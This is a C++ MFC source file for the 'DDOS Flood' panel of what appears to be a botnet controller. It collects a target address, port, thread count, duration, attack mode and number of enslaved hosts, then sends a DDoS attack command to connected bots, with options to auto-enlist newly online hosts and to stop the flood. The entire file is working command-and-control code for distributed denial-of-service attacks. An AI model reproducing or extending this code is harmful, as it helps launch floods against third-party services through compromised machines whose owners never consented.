// DDOSFlood.cpp : implementation file
//

#include "pcl.h"
#include "Client.h"
#include "DDOSFlood.h"
#include "PcView.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CPcView* g_pConnectView;

/////////////////////////////////////////////////////////////////////////////
// CDDOSFlood

IMPLEMENT_DYNCREATE(CDDOSFlood, CFormView)

CDDOSFlood::CDDOSFlood()
	: CFormView(CDDOSFlood::IDD)
{
	//{{AFX_DATA_INIT(CDDOSFlood)
	m_check_flood_auto = FALSE;
	m_check_flood_online = FALSE;
	m_flood_dns = _T("192.168.1.130");
	m_flood_hostnum = 100;
	m_flood_port = 80;
	m_flood_thread = 20;
	m_flood_time = 0;
	//}}AFX_DATA_INIT
}

CDDOSFlood::~CDDOSFlood()
{
}

void CDDOSFlood::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CDDOSFlood)
	DDX_Control(pDX, IDC_SPIN_FLOOD_TIME, m_spin_flood_time);
	DDX_Control(pDX, IDC_SPIN_FLOOD_THREAD, m_spin_flood_thread);
	DDX_Control(pDX, IDC_SPIN_FLOOD_HOST, m_spin_flood_host);
	DDX_Control(pDX, IDC_COMBO_FLOOD_MODLE, m_combo_flood_modle);
	DDX_Check(pDX, IDC_CHECK_FLOOD_AUTO, m_check_flood_auto);
	DDX_Check(pDX, IDC_CHECK_FLOOD_ONLINE, m_check_flood_online);
	DDX_Text(pDX, IDC_FLOOD_DNS, m_flood_dns);
	DDV_MaxChars(pDX, m_flood_dns, 500);
	DDX_Text(pDX, IDC_FLOOD_HOSTNUM, m_flood_hostnum);
	DDX_Text(pDX, IDC_FLOOD_PORT, m_flood_port);
	DDX_Text(pDX, IDC_FLOOD_THREAD, m_flood_thread);
	DDX_Text(pDX, IDC_FLOOD_TIME, m_flood_time);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CDDOSFlood, CFormView)
	//{{AFX_MSG_MAP(CDDOSFlood)
	ON_BN_CLICKED(IDC_FLOOD_START, OnFloodStart)
	ON_BN_CLICKED(IDC_FLOOD_STOP, OnFloodStop)
	ON_BN_CLICKED(IDC_SLECT_ALL, OnSlectAll)
	ON_BN_CLICKED(IDC_SLECT_NOW, OnSlectNow)
	ON_BN_CLICKED(IDC_UNSLECT_ALL, OnUnslectAll)
	ON_BN_CLICKED(IDC_UNSLECT_NOW, OnUnslectNow)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CDDOSFlood diagnostics

#ifdef _DEBUG
void CDDOSFlood::AssertValid() const
{
	CFormView::AssertValid();
}

void CDDOSFlood::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CDDOSFlood message handlers


void CDDOSFlood::OnFloodStart() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	//过滤各信息
	CString strPort, strThread, strTime, strHostNum;
	GetDlgItem(IDC_FLOOD_PORT)->GetWindowText(strPort);
	GetDlgItem(IDC_FLOOD_THREAD)->GetWindowText(strThread);
	GetDlgItem(IDC_FLOOD_TIME)->GetWindowText(strTime);
	GetDlgItem(IDC_FLOOD_HOSTNUM)->GetWindowText(strHostNum);

	if (m_flood_dns.IsEmpty() || strPort.IsEmpty()|| strThread.IsEmpty()|| strTime.IsEmpty() || strHostNum.IsEmpty())
	{
		::MessageBox(0,"请输入完整信息","错误", MB_ICONINFORMATION);
		return;
	}

	if (m_flood_port <1 || m_flood_port >65535)
	{
		::MessageBox(0,"端口范围:1~65535","错误", MB_ICONINFORMATION);
		return;
	}

	if (m_flood_thread <1 || m_flood_thread >50)
	{
		::MessageBox(0,"线程范围:1~50","错误", MB_ICONINFORMATION);
		return;
	}

	if (m_flood_time <0 )
	{
		::MessageBox(0,"时间范围:大于0","错误", MB_ICONINFORMATION);
		return;
	}

	if (m_flood_hostnum <1 )
	{
		::MessageBox(0,"主机范围:大于1","错误", MB_ICONINFORMATION);
		return;
	}

	DATTACK m_Attack;
	ZeroMemory(&m_Attack,sizeof(DATTACK));
	//获取目标
	strcpy(m_Attack.Target,m_flood_dns.GetBuffer(0));
	//获取端口
	m_Attack.AttackPort = m_flood_port;
	//获取线程数
	m_Attack.AttackThread = m_flood_thread;
	//获取时间
	m_Attack.AttackTime = m_flood_time;
	//攻击类型类型
	CString szType;
	GetDlgItemText(IDC_COMBO_FLOOD_MODLE,szType);
	if(szType =="[01]")
		m_Attack.AttackType = 1;
	if(szType == "[02]")
		m_Attack.AttackType = 2;
	if(szType == "[03]")
		m_Attack.AttackType = 3;
	if(szType == "[04]")
		m_Attack.AttackType = 4;
	if(szType == "[05]")
		m_Attack.AttackType = 5;
	if(szType == "[06]")
		m_Attack.AttackType = 6;
	if(szType == "[07]")
		m_Attack.AttackType = 7;
	if(szType == "[08]")
		m_Attack.AttackType = 8;

	CString m_DdosType = "Flood 1";
	strcpy(m_Attack.DDOSType,m_DdosType.GetBuffer(0));

	//获取参与主机..
	INT HostNums=-1;
	if(m_check_flood_online == FALSE)
		HostNums = m_flood_hostnum;
	//获取新上线主机是否自动参数
	if(m_check_flood_auto == TRUE)
	{
		g_pConnectView->m_iocpServer->m_bIsAutoD=true;
	}
	else
	{
       g_pConnectView->m_iocpServer->m_bIsAutoD=false;
	}

 	memcpy(g_pConnectView->m_iocpServer->m_strbuff, &m_Attack, sizeof(DATTACK));		
	
	g_pConnectView->SendDDosAttackCommand(&m_Attack,HostNums);
	GetDlgItem(IDC_COMBO_FLOOD_MODLE)->EnableWindow(FALSE);
}

void CDDOSFlood::OnFloodStop() 
{
	// TODO: Add your control notification handler code here
	g_pConnectView->SendDDostStopCommand("Flood 1");
	GetDlgItem(IDC_COMBO_FLOOD_MODLE)->EnableWindow(TRUE);
}

void CDDOSFlood::OnInitialUpdate() 
{
	CFormView::OnInitialUpdate();
	// TODO: Add your specialized code here and/or call the base class
	m_spin_flood_time.SetRange(0,10000);
	m_spin_flood_time.SetPos(0);
	m_spin_flood_time.SetBuddy(GetDlgItem(IDC_FLOOD_TIME));
	
	m_spin_flood_thread.SetRange(1,50);
	m_spin_flood_thread.SetPos(20);
	m_spin_flood_thread.SetBuddy(GetDlgItem(IDC_FLOOD_THREAD));
	
	m_spin_flood_host.SetRange(1,10000);
	m_spin_flood_host.SetPos(100);
	m_spin_flood_host.SetBuddy(GetDlgItem(IDC_FLOOD_HOSTNUM));

	m_combo_flood_modle.SetCurSel(0);
}

void CDDOSFlood::OnSlectAll() 
{
	// TODO: Add your control notification handler code here
	g_pConnectView->SeclectAll();
}

void CDDOSFlood::OnSlectNow() 
{
	// TODO: Add your control notification handler code here
	g_pConnectView->SeclectNow();
}

void CDDOSFlood::OnUnslectAll() 
{
	// TODO: Add your control notification handler code here
	g_pConnectView->UnSeclectAll();
}

void CDDOSFlood::OnUnslectNow() 
{
	// TODO: Add your control notification handler code here
	g_pConnectView->UnSeclectNow();
}
